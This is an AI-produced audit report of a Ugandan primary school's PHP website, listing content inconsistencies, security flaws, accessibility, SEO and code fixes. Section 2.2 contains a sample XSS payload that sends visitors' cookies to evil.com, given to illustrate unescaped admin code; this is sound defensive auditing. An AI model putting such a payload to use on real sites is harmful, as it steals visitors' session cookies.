# Lukman Primary School Website — Full Audit Report
**Date:** May 2026 | **Auditor:** Claude Code  
**Site:** http://localhost:8888/lukman-ps/ → Production: https://lukmanps.ac.ug

---

## Table of Contents
1. [Critical Data / Content Issues](#1-critical-data--content-issues)
2. [Security Vulnerabilities](#2-security-vulnerabilities)
3. [Professionalism & Credibility](#3-professionalism--credibility)
4. [UI / UX Improvements](#4-ui--ux-improvements)
5. [Accessibility](#5-accessibility)
6. [SEO & Structured Data](#6-seo--structured-data)
7. [Code Quality & Backend](#7-code-quality--backend)
8. [Missing Pages & Features](#8-missing-pages--features)
9. [Priority Action Plan](#9-priority-action-plan)

---

## 1. Critical Data / Content Issues

### 1.1 🔴 CRITICAL — Founding Year Conflict (1997 vs. 2004)
This is the single most damaging factual inconsistency on the site. Different pages claim two different founding years:

| Location | Year Shown | Source |
|---|---|---|
| `index.php` hero chip | "Est. 1997" | Hardcoded string |
| `index.php` stats bar | `date('Y') - 1997` = "29+ Years" | Hardcoded calculation |
| `index.php` bento grid, impact section | 1997 everywhere | Hardcoded |
| `about.php` | "2004" (default) | `getSetting('founding_year', '2004')` |
| `includes/footer.php` about blurb | "since 2004" | Hardcoded string |
| `includes/header.php` Schema.org | `"foundingDate": "2004-04-19"` | Hardcoded |

**Impact:** Parents, journalists, or inspectors who cross-reference pages will see conflicting founding dates. It destroys trust.

**Fix:**  
- Settle on the correct year (clarify: UMWA NGO was registered in 1997; the school may have opened later).  
- Store it **once** in `site_settings` as `founding_year`.  
- Replace every hardcoded `1997` / `2004` reference with `getSetting('founding_year', 'YYYY')`.  
- Update the Schema.org `foundingDate` in `includes/header.php` line 77 to be dynamic.

---

### 1.2 🔴 CRITICAL — Enrollment Stats Inconsistency Across Pages
Two completely different numbers appear depending on which page the visitor reads:

| Page | Students | Teachers |
|---|---|---|
| Homepage (index.php) | **1,000+** (hardcoded strings) | **60+** (hardcoded) |
| About page | **500+** (DB default fallback) | **30+** (DB default fallback) |

If the database `site_settings` table doesn't have `total_students` / `total_teachers` populated, the About page shows half the student count of the homepage. A parent who sees 1,000+ on the homepage and 500+ on About will be confused.

**Fix:**  
- Populate `total_students` and `total_teachers` in the `site_settings` table via the admin panel.  
- On `index.php`, replace the hardcoded `"1,000+"` strings with `getSetting('total_students', '1000')`.

---

### 1.3 🟠 Hardcoded PLE Fallback Data in results.php
`results.php` (lines 24–36) contains a PHP array with fabricated/estimated PLE results for 2021, 2022, and 2023. This data is displayed to the public when the database `academic_results` table is empty.

**Risk:** If these figures don't match official UNEB records, the school could face complaints or reputational damage.

**Fix:** Either populate the database with verified UNEB results and remove the fallback, or clearly label fallback data as "For illustrative purposes — contact school for official figures."

---

### 1.4 🟠 Inconsistent Contact Email (Gmail vs. Official Domain)
The site uses a Gmail address as the **primary contact email** in multiple places:

- `functions.php` default: `lukmanps2004@gmail.com`  
- `contact.php` HTML: `info@lukmanps.ac.ug` (hardcoded directly, not from settings)  
- `admissions.php` admin notification: `lukmanps2004@gmail.com`  
- Footer: pulls from DB settings (could be either)  

**Fix:**  
- Set `contact_email` in `site_settings` to `info@lukmanps.ac.ug`.  
- Remove `lukmanps2004@gmail.com` from all default fallbacks.  
- Remove the hardcoded `info@lukmanps.ac.ug` from `contact.php` line 104 — use `getSetting()` instead.

---

### 1.5 🟡 Twitter Handle Hardcoded
`includes/header.php` line 60 has `<meta name="twitter:site" content="@LukmanPS">` hardcoded — it doesn't pull from the social settings in the database. If the school's actual Twitter/X handle is different, this is wrong.

**Fix:** Add a `twitter_handle` key to `site_settings` and use it dynamically.

---

### 1.6 🟡 Google Maps Pin May Show Wrong Location
`contact.php` line 118–122 embeds a Google Map using a text search query: `q=Lukman+Primary+School+Entebbe+Uganda`. Text-based queries can return incorrect pins or multiple results.

**Fix:** Use precise GPS coordinates. Lukman PS Entebbe is approximately at lat `0.0443`, lng `32.4752`. Use:  
```html
src="https://maps.google.com/maps?q=0.0443,32.4752&output=embed"
```

---

### 1.7 🟡 "Baby Class" Mentioned in Content But Missing from Admissions Form
`about.php` and `academics.php` mention the curriculum runs from "Baby Class to Primary 7", but the admission inquiry form (`admissions.php` line 288) only offers `P1–P7` in the class selector. Baby Class / Nursery is missing.

**Fix:** Add `Baby Class`, `Middle Class`, `Top Class` (or however the school labels pre-primary) to the `class_applying` dropdown, and validate those values server-side.

---

### 1.8 🟡 Fees Table Is Entirely Blank
`admissions.php` lines 157–165 show a fees table where every cell says either "Contact school" or "Per term" or "One-off" with no actual figures. Parents landing on this page have no cost indication whatsoever.

**Fix:** Either:
- Publish the actual fee structure (stored in `site_settings` or a dedicated `fees` table), or  
- Add a more helpful CTA: "Download our current fees structure (PDF)" linking to an actual document in Downloads.

Currently, the download link goes to `downloads.php` but there's no guarantee a fees PDF is uploaded there.

---

## 2. Security Vulnerabilities

### 2.1 🔴 CRITICAL — Admissions Form Has No CSRF Protection
`contact.php` correctly uses `<?php echo csrfField(); ?>` and calls `validateCsrfToken()`.  
`admissions.php` form (line 240–334) has **no CSRF token at all**.

An attacker could forge cross-site requests to submit fake admission inquiries on behalf of victims.

**Fix:** Add `<?php echo csrfField(); ?>` inside the `<form>` in `admissions.php`, and validate the token at the top of the POST handler.

---

### 2.2 🔴 CRITICAL — Raw Echo of `customHeadCode` and `customFooterCode`
`includes/header.php` lines 127–128:
```php
<?php echo $customHeadCode; ?>
```
`includes/footer.php` line 192:
```php
<?php echo $customFooterCode; ?>
```
These settings values are echoed **without any escaping**. If an attacker compromises an admin account and sets `custom_head_code` to `<script>document.location='https://evil.com?c='+document.cookie</script>`, every visitor gets XSS.

**Fix:** These fields should only be used by highly trusted super-admins and should have a separate permission level. At minimum, document the risk prominently. If full HTML injection is required for legitimate use (tracking pixels, etc.), add a warning in the admin UI.

---

### 2.3 🟠 Open Redirect via `$_SERVER['HTTP_REFERER']`
`functions.php` line 461:
```php
header('Location: ' . $_SERVER['HTTP_REFERER']);
exit;
```
`HTTP_REFERER` is a user-controlled header. An attacker can craft a form submission that redirects users to an external site after "submitting" (phishing). This code path handles the legacy `action=enroll` POST handler.

**Fix:** Replace with a safe internal redirect:
```php
header('Location: ' . ($_SERVER['SCRIPT_NAME'] ?? '/index.php'));
```

---

### 2.4 🟠 No Rate Limiting on Admissions Inquiry Form
`contact.php` has a 1-hour duplicate check by email + subject. `admissions.php` has **no rate limiting** at all. A bot can flood the admin inbox with fake admission inquiries.

**Fix:** Add the same duplicate-check pattern used in `contact.php` to `admissions.php`, or implement a simple `recaptcha` / honeypot field.

---

### 2.5 🟠 Admin Login Link Exposed in Footer
`includes/footer.php` line 138 publicly links to `admin/login.php`:
```php
<a href="admin/login.php" ...><i class="fas fa-lock me-1"></i>Admin</a>
```
While the admin panel requires a password, exposing the login URL:
- Invites brute-force attempts
- Signals to scrapers/bots where the admin panel lives

**Fix:** Remove the footer link. Administrators know the URL. Add it to a comment in source or internal documentation only.

---

### 2.6 🟡 `@mail()` Suppresses Email Delivery Errors
Both `contact.php` and `admissions.php` use `@mail(...)` with the error-suppression operator. Failed emails (e.g., on a server with no sendmail configured) are silently swallowed — admin never receives the inquiry.

**Fix:** Use PHPMailer with SMTP credentials. At minimum, remove the `@` and log failures:
```php
$sent = mail($to, $subject, $body, $headers);
if (!$sent) error_log("Mail failed to: $to | Subject: $subject");
```

---

### 2.7 🟡 Canonical URL Built from `HTTP_HOST` (Can Be Spoofed)
`includes/header.php` lines 33, 49, 52:
```php
'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']
```
`HTTP_HOST` can be manipulated by an attacker to inject a different hostname into the canonical tag.

**Fix:** Define the site's base URL in `config.php`:
```php
define('SITE_BASE_URL', 'https://lukmanps.ac.ug');
```
Use `SITE_BASE_URL . $_SERVER['REQUEST_URI']` for canonical tags.

---

### 2.8 🟡 Logs Directory Accessible (Web Root)
A `/logs/` directory exists inside the web root. It is blocked by `robots.txt` (which bots can ignore) but not protected by a `.htaccess` deny rule.

**Fix:** Add `/Applications/MAMP/htdocs/lukman-ps/logs/.htaccess`:
```apache
Deny from all
```
Or move logs outside the web root entirely.

---

## 3. Professionalism & Credibility

### 3.1 🔴 Gmail as the Primary School Email
Using `lukmanps2004@gmail.com` as the default contact address across admin notifications and fallbacks signals that the school is informal. The school has the domain `lukmanps.ac.ug`.

**Fix:** Set up and use `info@lukmanps.ac.ug` exclusively. Update all fallback defaults in `functions.php`, `contact.php`, and `admissions.php`.

---

### 3.2 🟠 Fees Structure Is Empty / Non-Committal
Parents comparing schools want at least a fee range. The current table is entirely placeholder. A school that hides all fee information forces every prospective parent to make a phone call before they can even shortlist the school.

**Recommendation:**  
- Publish actual term fees (boarding vs. day).  
- If fees change frequently, publish a downloadable PDF from Downloads that is dated.
- Add "Last updated: Term 1 2026" so parents know the figures are current.

---

### 3.3 🟠 Inconsistency in School Name Usage
The site uses several variants interchangeably with no clear rule:
- "Lukman Primary School" (full name)
- "Lukman PS" (short code)
- "LPS" (abbreviation)

`about.php` line 7 sets `$siteShortName = getSetting('site_short_name', 'Lukman PS')` but the hero breadcrumb chip uses "LPS" from `$siteShortName` fallback. Standardise to two forms: full name and one abbreviation.

---

### 3.4 🟡 Backup CSS Files Committed to Project
Three backup/pre-redesign CSS files live in the project:
- `assets/css/style-backup.css`
- `assets/css/style-backup-pre-redesign.css`
- `admin/assets/css/admin-backup-pre-redesign.css`

These are served by the web server and add unnecessary weight. They should be deleted from the project (kept in git history if needed) or moved outside the web root.

---

### 3.5 🟡 Multiple Redundant Planning Markdown Files in Project Root
The following planning/transition documents are committed in the web root and publicly accessible:
- `DIGITAL-STRATEGY.md`
- `FUTURE-ROADMAP.md`
- `NEXT-IMPLEMENTATION-BATCH.md`
- `SCHOOL-FEATURES.md`
- `TESTING-PLAN.md`
- `TRANSFER-PLAN-DETAILED.md`
- `TRANSFER-PLAN.md`
- `WORDPRESS-ANALYSIS.md`
- `WEBSITE-AUDIT-2026.md` *(this file)*

These expose your development strategy, feature plans, and migration path to anyone who guesses the URL. Move them to a private folder outside the web root or a private repository wiki.

---

### 3.6 🟡 Developer Credit Links from the Footer
The footer displays "Developed by TusomeTech" with a link to `https://tusometech.com`. While developer credits are common, for a school website targeting parents:
- Verify the link goes to a working, professional website.
- Consider making it visible only at very low opacity or placing it in the admin panel instead.

---

## 4. UI / UX Improvements

### 4.1 🔴 Homepage Stats Repeated Three Times
The same numbers appear in three distinct sections of a single page scroll:
1. **Hero Stats Bar** — 1,000+ Students, 60+ Teachers, 29+ Years, 2 Curricula
2. **Bento Grid Tile A** — "1,000+ Students" super-stat
3. **Impact Section** — 1,000+ Students, 60+ Teachers, Division 1, 29+ Years

A parent who scrolls the full homepage sees identical statistics three times. This creates a sense of low-quality, copy-pasted content.

**Fix:** Reduce stats to two appearances maximum (hero + one mid-page section). Use the mid-page section for more granular/interesting data (e.g., specific PLE results, number of alumni, sports trophies).

---

### 4.2 🟠 Gallery Filter and Lightbox Are Out of Sync
The homepage gallery (`index.php` lines 466–602) has category filter buttons (All, Campus, Learning, Activities, Sports). Clicking a filter hides/shows grid items via CSS. However, all images share `data-lightbox="gallery"`, so the lightbox still navigates through hidden (filtered-out) images. A user who filters to "Sports" and clicks a photo will find the lightbox cycling through all 11 photos.

**Fix:** When a filter is applied, regenerate the lightbox grouping. A simple approach is to use different `data-lightbox` values per category, then on filter button click, update the currently visible images' `data-lightbox` to a common value and others to a unique non-shared value.

---

### 4.3 🟠 No Submission Loading State on Forms
Both the contact form and the admissions inquiry form have no visual feedback after clicking Submit. On slow connections (common in Uganda), the user may click multiple times, submitting duplicate inquiries, or give up thinking nothing happened.

**Fix:** On submit button click, disable the button and show a spinner:
```javascript
form.addEventListener('submit', function() {
    const btn = this.querySelector('[type=submit]');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Sending...';
});
```

---

### 4.4 🟠 WhatsApp Float Button Conflicts with Cookie Banner on Mobile
Both elements are fixed to the bottom of the viewport:
- Cookie banner: `position: fixed; bottom: 0; left: 0; right: 0` (full width)
- WhatsApp button: `position: fixed; bottom: 20px; right: 20px`

On mobile, when the cookie banner is visible, the WhatsApp button is hidden behind it. After cookie acceptance the button reappears, but the first impression is broken.

**Fix:** When the cookie banner is visible, push the WhatsApp button up (`bottom: 80px` or dynamically offset it by the banner height).

---

### 4.5 🟠 Events Cards Use Entirely Inline CSS
`index.php` lines 812–845 render upcoming event cards using 100% inline `style=""` attributes. This:
- Makes the design impossible to override in `style.css`
- Creates maintenance nightmares
- Inflates HTML payload

**Fix:** Extract these styles into named CSS classes in `style.css` (e.g., `.event-card-date`, `.event-card-body`).

---

### 4.6 🟡 News Cards Are Missing AOS Animations
The news section (`index.php` lines 752–797) doesn't have `data-aos` attributes on the cards, while every other section (testimonials, events, team) uses `data-aos="zoom-in"` or `data-aos="fade-up"`. The news cards appear to "pop in" instantly, which feels inconsistent.

---

### 4.7 🟡 "About Story" Section Duplicates the Head Teacher Welcome
The homepage has two sections that cover overlapping ground:
- **Head Teacher's Welcome** (section `#welcome`) — quotes Hajjat Aisha, talks about the school setting
- **About Story** (section `#about-story`) — more background on the school, the UMWA, Lukman Al-Hakim name

Both appear one after the other in the same scroll. Consider merging them or choosing one.

---

### 4.8 🟡 Hero Float Cards Show Inconsistent Stat Formatting
`index.php` line 144: `<strong>1,000+</strong>` in one float card.  
Line 152: `<strong><?php echo date('Y') - 1997; ?> Yrs</strong>` in the other.  
The stats bar (line 172) shows `29+` (with a `+`), but the float card omits the `+`.

**Fix:** Decide on a consistent format (e.g., always include `+` for estimates) and apply it everywhere.

---

### 4.9 🟡 Contact Form Uses Visually-Hidden Labels
`contact.php` lines 152–171 use `class="visually-hidden"` on all `<label>` elements. This is technically accessible for screen readers, but:
- Sighted users see only placeholder text, which disappears when typing — they may forget what field they're filling
- On browser autofill, labels remain invisible
- Non-standard UX for a school parent audience (not a tech product)

**Fix:** Use visible labels above the fields. The design can still be clean; visible labels are more universally usable.

---

### 4.10 🟡 No "Back to Top" Button on Long Pages
Pages like `about.php`, `academics.php`, and `student-life.php` are long single-column scrolls with no way to quickly return to the top. The navigation is sticky which helps, but a back-to-top button is standard UX.

---

### 4.11 🟡 Admissions Page Has No Pricing Anchor CTA
When parents scroll to the fees table and see "Contact school" for all amounts, there is no immediately visible next step (a call button, a WhatsApp link). The next CTA is below the fold. Add a quick "Call us for fees" action inline with the table.

---

## 5. Accessibility

### 5.1 🔴 Homepage Missing `<main>` Landmark Element
`index.php` renders all page content between `<nav>` and `<footer>` **without** a `<main>` element. Compare with `admissions.php`, `student-life.php`, and `contact.php` which all have `<main id="main-content">`.

Screen reader users and keyboard navigators rely on the `<main>` landmark to skip to content. Its absence on the homepage is a WCAG 2.1 Level A failure.

**Fix:** Wrap the main content of `index.php` in `<main id="main-content">...</main>` after the notice strip.

---

### 5.2 🔴 No Skip-to-Content Link
No `<a href="#main-content" class="visually-hidden-focusable">Skip to main content</a>` link exists anywhere on the site. Without it, keyboard users must tab through every navigation link on every page load.

**Fix:** Add to the very top of `includes/header.php` immediately after `<body>`:
```html
<a href="#main-content" class="skip-link visually-hidden-focusable">Skip to main content</a>
```

---

### 5.3 🟠 Notice Strip "Details" Button Has No ARIA Attributes
`includes/header.php` lines 258–263 render inline `<button>` elements inside the notice strip that toggle content visibility. These use `style.display` toggle but have no `aria-expanded` attribute to communicate state to screen readers.

---

### 5.4 🟠 Gallery Grid Has No Keyboard Navigation Support
The gallery filter buttons use `type="button"` (correct), but the filterable `.gal-cell` items that are hidden get `display:none` — this is fine. However, without focus management after filtering, a keyboard user who clicks a filter button will lose their focus position.

---

### 5.5 🟡 Missing `lang` Attribute Consideration for Arabic Content
The site serves Arabic text (Quran references, Hijri date, Arabic names) embedded in English pages, but no `lang="ar"` attribute wraps Arabic text. Screen readers will try to read Arabic text with English pronunciation. Add `lang="ar" dir="rtl"` to any Arabic script spans.

---

## 6. SEO & Structured Data

### 6.1 🟠 Schema.org `foundingDate` Hardcoded (Wrong Value)
`includes/header.php` line 77 hardcodes `"foundingDate": "2004-04-19"`. As noted in §1.1, the founding year is inconsistent across the site. This date should come from settings and match the correct confirmed year.

---

### 6.2 🟠 News Detail Pages Use `?id=` Not SEO-Friendly Slugs
The `news_posts` table has a `slug` column. The DB schema even has `INDEX idx_slug (slug)` and `UNIQUE` constraint. But `index.php` links to `news-detail.php?id=123`. URLs like `/news-detail.php?id=5` are not indexed as well as `/news/our-ple-results-2024/`.

**Fix:** Update `news-detail.php` to accept both `?id=` (fallback) and `?slug=` (primary), and update all news links to use slugs.

---

### 6.3 🟡 Meta Keywords Tag Is Deprecated
`includes/header.php` line 28: `<meta name="keywords" content="...">`. Google has ignored this tag since 2009. It adds HTML weight and can potentially signal spam to competitors using it for competitive analysis.

**Fix:** Remove the `<meta name="keywords">` tag entirely.

---

### 6.4 🟡 Canonical URL Includes Query Strings
`includes/header.php` line 33 builds canonical from `$_SERVER['REQUEST_URI']` which includes query strings. If a page is accessed as `contact.php?ref=social`, the canonical becomes `https://lukmanps.ac.ug/contact.php?ref=social` — a different canonical than the clean `contact.php`.

**Fix:** Strip query strings from the canonical URL:
```php
$cleanPath = strtok($_SERVER['REQUEST_URI'], '?');
echo 'https://' . SITE_BASE_URL . $cleanPath;
```

---

### 6.5 🟡 Missing Open Graph Image on Most Pages
The OG image only shows if `og_image` is set in `site_settings`. If not set (likely on a fresh install or if never configured in admin), all social shares show the site title with no image — drastically reducing click-through rates from Facebook/WhatsApp shares.

**Fix:** Set a default OG image (e.g., the school logo or a hero campus photo) that always serves as fallback:
```php
$ogImage = getSetting('og_image', 'assets/images/lukman-transparent-bordered-logo.png');
```

---

### 6.6 🟡 `sitemap.php` Not Verified / Dynamic
`robots.txt` points to `https://lukmanps.ac.ug/sitemap.php`. This is a dynamic PHP sitemap, which is good. However, it's not clear if it includes all pages (results, prayer-times, quran, etc.) or only the main ones. Verify the sitemap outputs all important URLs with correct `<lastmod>` dates.

---

## 7. Code Quality & Backend

### 7.1 🟠 Dual DB Connection Mechanism (Global $pdo + getDBConnection)
`functions.php` opens a PDO connection globally at the top (line 13) into `$pdo` — this is available directly to all pages that `include 'functions.php'`. However, `getDBConnection()` (line 22) creates a **new** PDO connection each time it's called. Functions like `saveEnrollment()`, `isDuplicateEnrollment()`, `loadSiteSettings()` all call `getDBConnection()` internally — meaning each page request can open 3–5+ database connections.

**Fix:** Have `getDBConnection()` return the existing global `$pdo` if it's already established, or restructure to use a singleton:
```php
function getDBConnection() {
    global $pdo;
    if ($pdo instanceof PDO) return $pdo;
    // ... connection logic
}
```

---

### 7.2 🟠 Admissions Form — No Server-Side "Baby Class" Support
The class selector validation in `admissions.php` line 33:
```php
if (!in_array($classApplying, ['P1','P2','P3','P4','P5','P6','P7'])) ...
```
Only accepts P1–P7. If Baby Class is added to the UI dropdown (see §1.7), the server-side validation will reject it. Update both together.

---

### 7.3 🟡 `news_posts` FK Prevents Admin Deletion
`lukman-ps-schema.sql`: `news_posts.author_id` has `FOREIGN KEY (author_id) REFERENCES admin_users(id)` with no `ON DELETE` clause (defaults to RESTRICT). This means if an admin user who authored posts is deleted from `admin_users`, the delete will fail silently. The Activity Log FK uses `ON DELETE CASCADE`. Apply the same or use `ON DELETE SET NULL` with a nullable `author_id`.

---

### 7.4 🟡 Backup CSS Files Add Unnecessary Server Load
The following files are served by the web server and add disk weight:
- `assets/css/style-backup.css`
- `assets/css/style-backup-pre-redesign.css`
- `admin/assets/css/admin-backup-pre-redesign.css`

Delete them. Use git for version history.

---

### 7.5 🟡 JavaScript Loaded via CDN Without Subresource Integrity (SRI)
`includes/footer.php` loads Bootstrap, jQuery, Lightbox2 and AOS from CDNs without SRI hashes:
```html
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
```
If any CDN is compromised, malicious JS is served to all visitors.

**Fix:** Add `integrity` and `crossorigin` attributes. CDN providers publish SRI hashes on their documentation pages.

---

### 7.6 🟡 jQuery Loaded After Bootstrap — Wrong Order
`includes/footer.php` loads Bootstrap first, then jQuery. Bootstrap 5 doesn't need jQuery, so this is fine for Bootstrap, but if any site JavaScript depends on jQuery being available before Bootstrap initialises certain components, it could break. More importantly, the order `bootstrap.bundle.min.js → jquery.min.js` is unconventional and may confuse future maintainers.

---

### 7.7 🟡 `functions.php` Handles POST Silently at Global Scope
`functions.php` lines 447–463 contain a live POST handler at file scope:
```php
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'enroll') {
```
This runs on every `include 'functions.php'` regardless of the page. It's a leftover pattern that makes the code difficult to trace and debug. Move this to a dedicated endpoint file or a controller.

---

## 8. Missing Pages & Features

### 8.1 🔴 `privacy.php` Does Not Exist
The cookie consent banner (`includes/footer.php` line 201) links to `privacy.php`:
```html
<a href="privacy.php" class="cookie-link">Learn more</a>
```
This page does not exist in the project. Visitors who click it get a 404. Under GDPR and Uganda's Data Protection Act 2019, a privacy policy is legally required for websites that collect personal data (which this one does via contact and admission forms).

**Fix:** Create a `privacy.php` page with a proper Privacy Policy covering:
- What data is collected (name, email, phone, IP)
- How it's stored (database)
- Who can access it (school admin)
- Contact for data requests

---

### 8.2 🟠 No Terms & Conditions / Admission Policy Page
The admissions form collects sensitive child data (name, DOB, gender) with no linked terms or consent checkbox. At minimum, add a checkbox:
```html
<input type="checkbox" name="consent" required>
I consent to Lukman PS storing and processing my child's information for admission purposes.
<a href="privacy.php">Privacy Policy</a>
```

---

### 8.3 🟠 No Alumni / Former Students Section
The school has been operating since 1997/2004 — it has thousands of former pupils. An Alumni section would:
- Generate rich testimonials  
- Boost credibility ("our graduates are now at top schools / universities")  
- Create a sense of community  

---

### 8.4 🟡 No School Fee Payment Portal
The site has Pesapal / payment code references in `functions.php` (`convertUsdToUgx`, `getExchangeRate`, `formatDonationAmount`) but no visible online payment page for school fees. If the payment feature is planned, complete it — if abandoned, remove the dead code.

---

### 8.5 🟡 No Newsletter Archive
`admin/newsletter.php` exists for managing newsletters, but there's no public page where parents can view past newsletters or subscribe online. The subscriber list is being built but the public-facing component seems missing.

---

### 8.6 🟡 Downloads Page May Be Empty
The admissions page repeatedly links to `downloads.php` for fee structures and brochures, but if no files are uploaded in the admin panel, the page will show nothing. Ensure at least a current fees structure PDF, school brochure, and term dates calendar are uploaded.

---

### 8.7 🟡 404 Page Needs Verification
`404.php` exists, but it needs to be verified that the web server (MAMP / Apache / Nginx) is configured to serve it for 404 errors. A `.htaccess` rule is needed:
```apache
ErrorDocument 404 /lukman-ps/404.php
```

---

## 9. Priority Action Plan

Recommended order of fixes for the rebuild:

### Immediate (Before Launch)
| # | Fix | File(s) |
|---|---|---|
| 1 | Resolve founding year — pick one year, use settings | `index.php`, `about.php`, `header.php`, `footer.php` |
| 2 | Add CSRF to admissions form | `admissions.php` |
| 3 | Create `privacy.php` | New file |
| 4 | Remove admin link from footer | `includes/footer.php` |
| 5 | Remove `@` error suppression from `mail()` calls | `admissions.php`, `contact.php` |
| 6 | Fix open redirect in `functions.php` line 461 | `functions.php` |
| 7 | Add `<main>` to `index.php` | `index.php` |
| 8 | Add skip-to-content link | `includes/header.php` |
| 9 | Standardize contact email to `info@lukmanps.ac.ug` | `functions.php`, `contact.php`, settings DB |
| 10 | Fix Google Maps to use coordinates | `contact.php` |

### Short Term (Sprint 1)
| # | Fix |
|---|---|
| 11 | Populate DB settings: `total_students`, `total_teachers`, `founding_year` |
| 12 | Fix stats inconsistency homepage vs. about page |
| 13 | Upload fees structure PDF and link from admissions page |
| 14 | Add form submission loading state (JS) |
| 15 | Remove deprecated `<meta name="keywords">` |
| 16 | Fix canonical URL (strip query strings, use defined base URL) |
| 17 | Fix OG image fallback |
| 18 | Delete backup CSS files |
| 19 | Move planning markdown files outside web root |
| 20 | Add .htaccess deny to `/logs/` |

### Medium Term (Sprint 2)
| # | Fix |
|---|---|
| 21 | Replace inline event card styles with CSS classes |
| 22 | Fix gallery filter + lightbox sync |
| 23 | Fix WhatsApp / cookie banner overlap on mobile |
| 24 | Add SRI hashes to CDN scripts |
| 25 | Switch to slug-based news detail URLs |
| 26 | Fix dual DB connection (getDBConnection singleton) |
| 27 | Add `news_posts` FK `ON DELETE SET NULL` migration |
| 28 | Verify and expand `sitemap.php` coverage |
| 29 | Reduce homepage stats to 2 occurrences (not 3) |
| 30 | Add "Baby Class / Pre-Primary" to admissions form |

### Ongoing / Content
| # | Fix |
|---|---|
| 31 | Publish verified PLE results in database (remove hardcoded fallback) |
| 32 | Add data consent checkbox to admissions form |
| 33 | Create Alumni / Former Students section |
| 34 | Ensure downloads page has actual PDFs |
| 35 | Configure web server `ErrorDocument 404` |
| 36 | Add back-to-top button on long inner pages |
| 37 | Set up Newsletter subscription public page |
| 38 | Add `lang="ar"` to Arabic text spans |

---

*This audit was generated after a full read of all PHP pages, includes, CSS, JS, schema, robots.txt, and project structure.*
